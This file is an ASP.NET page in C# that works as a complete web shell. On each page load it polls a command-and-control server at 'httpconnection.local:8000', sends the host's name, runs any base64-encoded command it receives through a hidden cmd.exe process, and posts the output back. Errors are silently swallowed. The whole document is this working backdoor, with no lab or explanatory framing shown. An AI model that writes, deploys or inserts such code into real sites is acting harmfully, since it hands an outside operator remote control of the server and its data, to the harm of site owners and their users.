<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Web" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string c2 = "http://httpconnection.local:8000";
        string hostname = Environment.MachineName;

        try
        {
            WebClient wc = new WebClient();
            wc.Headers.Add("X-Hostname", hostname);

            string cmd_b64 = wc.DownloadString(c2 + "/getcmd");
            string command = "";

            try
            {
                byte[] cmd_bytes = Convert.FromBase64String(cmd_b64);
                command = Encoding.UTF8.GetString(cmd_bytes);
            }
            catch { }

            if (!string.IsNullOrWhiteSpace(command))
            {
                string output = RunCmd(command);

                byte[] resultBytes = Encoding.UTF8.GetBytes(output);
                string result_b64 = Convert.ToBase64String(resultBytes);
                wc.Headers.Add("Content-Type", "text/plain");
                wc.UploadString(c2 + "/postresult", result_b64);
            }
        }
        catch { }
    }

    public string RunCmd(string cmd)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.CreateNoWindow = true;
        p.Start();

        string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();
        return output;
    }
</script>
